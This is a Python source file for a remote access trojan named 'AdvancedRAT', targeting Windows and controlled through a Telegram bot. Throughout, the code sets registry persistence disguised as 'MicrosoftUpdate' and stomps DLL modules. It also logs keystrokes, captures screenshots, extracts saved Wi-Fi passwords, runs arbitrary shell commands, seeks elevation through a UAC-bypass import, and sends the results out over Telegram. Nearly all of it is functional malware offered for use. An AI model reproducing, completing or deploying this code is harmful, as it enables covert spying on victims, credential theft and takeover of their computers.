import socket
import subprocess
import os
import sys
import json
import base64
import threading
import time
import random
import ctypes
import platform
import winreg
import requests
import psutil
from PIL import ImageGrab
from pynput import keyboard as kb_listener
import io

import file_manager
import cmds
from uac_bypass import UACBypass
from telegram_bridge import TelegramBridge

def _load_dotenv(path=".env"):
    """Minimal KEY=VALUE loader so .env works without python-dotenv."""
    try:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), path),
                  "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, _, v = line.partition("=")
                os.environ.setdefault(k.strip(), v.strip().strip("'\""))
    except OSError:
        pass


_load_dotenv()

# ================= CONFIG =================
SERVER_IP = "0.0.0.0"
SERVER_PORT = 4444

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID")

PERSISTENCE_NAME = "MicrosoftUpdate"
PERSISTENCE_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"

HIDE_CONSOLE = False  # set True to hide console window
DEBUG = True           # set False to silence console output


def log(msg):
    if DEBUG:
        try:
            print(msg, flush=True)
        except UnicodeEncodeError:
            enc = msg.encode("ascii", "replace").decode("ascii")
            print(enc, flush=True)


# ================= EVASION =================
def is_debugger_present():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0


def nt_delay_execution(ms=500):
    delay = -abs(int(ms)) * 10000
    class LARGE_INTEGER(ctypes.Structure):
        _fields_ = [("QuadPart", ctypes.c_longlong)]
    li = LARGE_INTEGER(delay)
    ctypes.windll.ntdll.NtDelayExecution(False, ctypes.byref(li))


def module_stomping(dll_path, payload):
    """Overwrite .text of a DLL image with payload bytes."""
    with open(dll_path, "rb") as f:
        data = bytearray(f.read())

    pe_off = int.from_bytes(data[0x3C:0x40], "little")
    if data[pe_off:pe_off + 4] != b"PE\x00\x00":
        return None

    num_sections = int.from_bytes(data[pe_off + 6:pe_off + 8], "little")
    opt_size = int.from_bytes(data[pe_off + 20:pe_off + 22], "little")
    sec_table = pe_off + 24 + opt_size

    for i in range(num_sections):
        off = sec_table + (i * 40)
        name = data[off:off + 8].rstrip(b"\x00")
        if name == b".text":
            raw_size = int.from_bytes(data[off + 16:off + 20], "little")
            raw_ptr = int.from_bytes(data[off + 20:off + 24], "little")
            payload = payload[:raw_size].ljust(raw_size, b"\x00")
            data[raw_ptr:raw_ptr + raw_size] = payload
            return bytes(data)
    return None


# ================= CONSOLE HIDING =================
class HVNC:
    def __init__(self):
        self.hwnd = ctypes.windll.kernel32.GetConsoleWindow()

    def hide(self):
        if self.hwnd:
            ctypes.windll.user32.ShowWindow(self.hwnd, 0)

    def show(self):
        if self.hwnd:
            ctypes.windll.user32.ShowWindow(self.hwnd, 5)


# ================= TELEGRAM =================
def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN.startswith("YOUR_"):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        try:
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=10)
            log(f"[+] Telegram sent: {message}")
            return True
        except Exception as e:
            log(f"[!] Telegram error: {e}")
            return False
    log("[!] Bot token not configured, skipping Telegram send")
    return False


# ================= PERSISTENCE =================
def create_persistence():
    try:
        if os.name != "nt":
            return {"status": "error", "message": "Windows only"}
        exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, PERSISTENCE_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        log(f"[+] Persistence set -> {exe_path}")
        return {"status": "success", "message": exe_path}
    except Exception as e:
        log(f"[!] Persistence failed: {e}")
        return {"status": "error", "message": str(e)}


def remove_persistence():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, PERSISTENCE_NAME)
        winreg.CloseKey(key)
        log("[+] Persistence removed")
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ================= KEYLOGGER =================
class KeyLogger:
    def __init__(self):
        self.keys = []
        self.listener = None

    def callback(self, key):
        try:
            self.keys.append(key.char)
        except AttributeError:
            self.keys.append(f"[{getattr(key, 'name', '?')}]")

    def start(self):
        self.listener = kb_listener.Listener(on_press=self.callback)
        self.listener.start()
        log("[+] Keylogger started")
        return self.listener

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
        log("[+] Keylogger stopped")

    def dump(self):
        text = "".join(self.keys)
        self.keys.clear()
        return {"status": "success", "data": text}


# ================= SYSTEM INFO =================
def get_system_info():
    try:
        return {
            "status": "success",
            "data": {
                "os": f"{platform.system()} {platform.release()}",
                "arch": platform.architecture()[0],
                "hostname": socket.gethostname(),
                "user": os.environ.get("USERNAME"),
                "cpu_cores": psutil.cpu_count(),
                "cpu_load": f"{psutil.cpu_percent(interval=1)}%",
                "ram_total": f"{psutil.virtual_memory().total / 1073741824:.1f} GB",
                "ram_used": f"{psutil.virtual_memory().used / 1073741824:.1f} GB",
                "boot_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(psutil.boot_time())),
            },
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


def whoami():
    """Report identity and elevation state - useful for diagnosing permission issues."""
    try:
        if os.name != "nt":
            return {"status": "success", "data": {"user": os.environ.get("USER"), "elevated": False}}
        admin = is_admin()
        try:
            import ctypes
            buf = ctypes.create_unicode_buffer(256)
            ctypes.windll.advapi32.GetUserNameW(buf, 256)
            user = buf.value
        except Exception:
            user = os.environ.get("USERNAME", "?")
        integrity = "high" if admin else "medium"
        return {
            "status": "success",
            "data": {
                "user": user,
                "machine": socket.gethostname(),
                "admin": admin,
                "integrity": integrity,
                "frozen": bool(getattr(sys, "frozen", False)),
                "exe": sys.executable,
            },
        }
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def get_process_list():
    try:
        procs = []
        for p in psutil.process_iter(["pid", "name", "username", "cpu_percent", "memory_percent"]):
            try:
                i = p.info
                procs.append({
                    "pid": i["pid"],
                    "name": i["name"],
                    "user": i["username"],
                    "cpu": i["cpu_percent"],
                    "ram": i["memory_percent"],
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        procs.sort(key=lambda x: (x["ram"] or 0), reverse=True)
        return {"status": "success", "data": procs}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def kill_process(pid):
    try:
        p = psutil.Process(int(pid))
        name = p.name()
        p.kill()
        return {"status": "success", "message": f"Killed {name} ({pid})"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def suspend_process(pid):
    try:
        p = psutil.Process(int(pid))
        name = p.name()
        p.suspend()
        return {"status": "success", "message": f"Suspended {name} ({pid})"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def resume_process(pid):
    try:
        p = psutil.Process(int(pid))
        name = p.name()
        p.resume()
        return {"status": "success", "message": f"Resumed {name} ({pid})"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ================= NETWORK =================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def get_network_info():
    try:
        rows = []
        for iface, entries in psutil.net_if_addrs().items():
            for e in entries:
                if e.family == socket.AF_INET:
                    rows.append({"type": "ip", "interface": iface, "addr": e.address})
                elif e.family == socket.AF_INET6:
                    rows.append({"type": "ipv6", "interface": iface, "addr": e.address[:40]})
        for c in psutil.net_connections(kind="inet"):
            if not c.raddr or c.status != "ESTABLISHED":
                continue
            rows.append({
                "type": "conn",
                "local": f"{c.laddr.ip}:{c.laddr.port}",
                "remote": f"{c.raddr.ip}:{c.raddr.port}",
                "pid": c.pid,
            })
        return {"status": "success", "data": rows}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def get_wifi_passwords():
    try:
        if os.name != "nt":
            return {"status": "error", "message": "Windows only"}
        try:
            raw = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                stderr=subprocess.STDOUT,
            ).decode("utf-8", "ignore")
        except subprocess.CalledProcessError as e:
            out = (e.output or b"").decode("utf-8", "ignore").strip()
            low = out.lower()
            if "no wireless interface" in low or "wireless lan service" in low:
                return {"status": "error", "message": "no wireless interface on this host"}
            if "is not a valid argument" in low:
                return {"status": "error", "message": "unexpected netsh syntax: " + out[:120]}
            return {"status": "error", "message": f"netsh failed: {out[:150] or e}"}
        except FileNotFoundError:
            return {"status": "error", "message": "netsh not found - not Windows"}

        profiles = []
        for line in raw.splitlines():
            line = line.strip()
            low = line.lower()
            if not low.startswith(("all user profile", "group profile")):
                continue
            if ":" not in line:
                continue
            ssid = line.split(":", 1)[1].strip().strip('"')
            if ssid and ssid != "<None>":
                profiles.append(ssid)

        if not profiles:
            return {"status": "success", "data": {}, "note": "no saved wireless profiles"}

        admin = is_admin()
        results = {}
        for ssid in profiles:
            try:
                detail = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", f'name={ssid}', "key=clear"],
                    stderr=subprocess.DEVNULL,
                ).decode("utf-8", "ignore")
            except Exception:
                results[ssid] = "<unavailable>"
                continue

            key = ""
            for dl in detail.splitlines():
                dl = dl.strip()
                if dl.lower().startswith("key content"):
                    key = dl.split(":", 1)[1].strip()
                    break
            results[ssid] = key if key else "<admin required>"

        return {"status": "success", "data": results, "elevated": admin}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


# ================= WINDOWS SYSTEM =================
def read_registry_key(key_path, hive="HKLM"):
    try:
        if os.name != "nt":
            return {"status": "error", "message": "Windows only"}
        root = {
            "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKCU": winreg.HKEY_CURRENT_USER,
            "HKCR": winreg.HKEY_CLASSES_ROOT,
        }[hive.upper()]
        key = winreg.OpenKey(root, key_path, 0, winreg.KEY_READ)
        values, i = [], 0
        while True:
            try:
                n, v, t = winreg.EnumValue(key, i)
                values.append({"name": n, "value": str(v), "type": t})
                i += 1
            except OSError:
                break
        winreg.CloseKey(key)
        return {"status": "success", "data": values}
    except FileNotFoundError:
        return {
            "status": "error",
            "message": f"key not found: {hive.upper()}\\{key_path}",
        }
    except PermissionError:
        return {"status": "error", "message": "access denied - needs admin"}
    except KeyError:
        return {"status": "error", "message": f"bad hive, use HKLM / HKCU / HKCR"}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def list_services():
    try:
        if os.name != "nt":
            return {"status": "error", "message": "Windows only"}
        return {"status": "success", "data": [s.name() for s in psutil.win_service_iter()]}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def get_startup_items():
    try:
        if os.name != "nt":
            return {"status": "error", "message": "Windows only"}
        items = []
        for hive, label in ((winreg.HKEY_CURRENT_USER, "HKCU"), (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            try:
                key = winreg.OpenKey(hive, PERSISTENCE_KEY, 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        n, v, _ = winreg.EnumValue(key, i)
                        items.append({"source": label, "name": n, "command": v})
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except OSError:
                pass
        folder = os.path.join(
            os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"
        )
        if os.path.isdir(folder):
            for f in os.listdir(folder):
                items.append({"source": "StartupFolder", "name": f, "command": os.path.join(folder, f)})
        return {"status": "success", "data": items}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def get_window_list():
    try:
        if os.name != "nt":
            return {"status": "error", "message": "Windows only"}
        user32 = ctypes.windll.user32
        windows = []

        @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p)
        def cb(hwnd):
            if user32.IsWindowVisible(hwnd):
                length = user32.GetWindowTextLengthW(hwnd)
                if length:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    user32.GetWindowTextW(hwnd, buf, length + 1)
                    pid = ctypes.c_ulong()
                    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                    windows.append({"hwnd": hwnd, "pid": pid.value, "title": buf.value})
            return True

        user32.EnumWindows(cb, 0)
        return {"status": "success", "data": windows}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def cmd_executor(command):
    try:
        proc = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=60
        )
        return {
            "status": "success",
            "output": proc.stdout,
            "error": proc.stderr,
            "code": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": "timeout after 60s"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def request_elevation(payload=""):
    """Elevate via ShellExecuteW 'runas' so the user gets a real UAC prompt.

    payload empty -> relaunch this implant elevated
    payload given -> run one elevated command via cmd.exe /c
    """
    if is_admin():
        return {"status": "success", "output": "already elevated"}

    command = payload.strip()
    if command:
        target, args = "cmd.exe", f"/c {command}"
    elif getattr(sys, "frozen", False):
        target, args = sys.executable, ""
    else:
        target = sys.executable
        args = subprocess.list2cmdline([os.path.abspath(sys.argv[0])] + sys.argv[1:])

    try:
        rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", target, args, None, 1)
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}

    if rc == 1223:
        return {"status": "error", "message": "UAC prompt declined by the user"}
    if rc <= 32:
        return {"status": "error", "message": f"ShellExecuteW failed, rc={rc}"}

    if command:
        return {"status": "success", "output": f"elevated: {command}"}

    # the new instance takes over the Telegram poll, so stand down to avoid a 409
    threading.Timer(3.0, lambda: os._exit(0)).start()
    return {"status": "success",
            "output": f"relaunched elevated ({target}); this instance exits in 3s"}


# ================= MODULES =================
class Modules:
    def __init__(self):
        self.fm = file_manager.FileManager()
        self.keylogger = KeyLogger()
        self.uac = UACBypass()
        self.fs = cmds.FileOps()

    def take_screenshot(self):
        """Return PNG bytes for direct upload as a Telegram photo."""
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.convert("RGB").save(buf, format="PNG", optimize=True)
            data = buf.getvalue()
            return {
                "status": "success",
                "_photo": data,
                "_caption": f"screenshot {img.width}x{img.height} ({len(data) // 1024} KB)",
            }
        except Exception as e:
            return {"status": "error", "message": f"{type(e).__name__}: {e}"}


# ================= MAIN =================
class AdvancedRAT:
    def __init__(self):
        self.is_running = True
        self.hvnc = HVNC()
        self.modules = Modules()
        self.bridge = TelegramBridge(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, self)

    # ---- capability surface used by the Telegram dispatch table ----
    cmd_executor = staticmethod(cmd_executor)
    get_system_info = staticmethod(get_system_info)
    whoami = staticmethod(whoami)
    get_process_list = staticmethod(get_process_list)
    kill_process = staticmethod(kill_process)
    suspend_process = staticmethod(suspend_process)
    resume_process = staticmethod(resume_process)
    get_network_info = staticmethod(get_network_info)
    get_wifi_passwords = staticmethod(get_wifi_passwords)
    read_registry_key = staticmethod(read_registry_key)
    list_services = staticmethod(list_services)
    get_startup_items = staticmethod(get_startup_items)
    get_window_list = staticmethod(get_window_list)
    create_persistence = staticmethod(create_persistence)
    remove_persistence = staticmethod(remove_persistence)
    request_elevation = staticmethod(request_elevation)

    # inventory / management surface
    get_datetime = staticmethod(cmds.get_datetime)
    get_idletime = staticmethod(cmds.get_idletime)
    check_admin = staticmethod(cmds.check_admin)
    get_installed = staticmethod(cmds.get_installed)
    get_devices = staticmethod(cmds.get_devices)
    get_ipconfig = staticmethod(cmds.get_ipconfig)
    get_netstat = staticmethod(cmds.get_netstat)
    get_env = staticmethod(cmds.get_env)
    get_wifi_networks = staticmethod(cmds.get_wifi_networks)
    geolocate = staticmethod(cmds.geolocate)

    def boot(self):
        log("[*] svhost starting")
        log(f"[*] python  : {sys.version.split()[0]}")
        log(f"[*] frozen  : {getattr(sys, 'frozen', False)}")
        log(f"[*] exe path: {sys.executable}")

        if is_debugger_present():
            log("[!] Debugger detected - stealth features degraded")

        res = create_persistence()
        log(f"[*] persistence: {res['status']}")

        if HIDE_CONSOLE:
            self.hvnc.hide()
            log("[*] console hidden")
        else:
            log("[*] console visible (HIDE_CONSOLE=False)")

        self.bridge.start()

        log("[*] ready - listening on Telegram")
        try:
            while self.is_running:
                time.sleep(1)
        except KeyboardInterrupt:
            log("[*] interrupted, exiting")
            self.is_running = False


if __name__ == "__main__":
    try:
        AdvancedRAT().boot()
    except Exception as exc:
        import traceback
        print("")
        print("=" * 60)
        print(f"FATAL: {type(exc).__name__}: {exc}")
        print("=" * 60)
        traceback.print_exc()
        input()
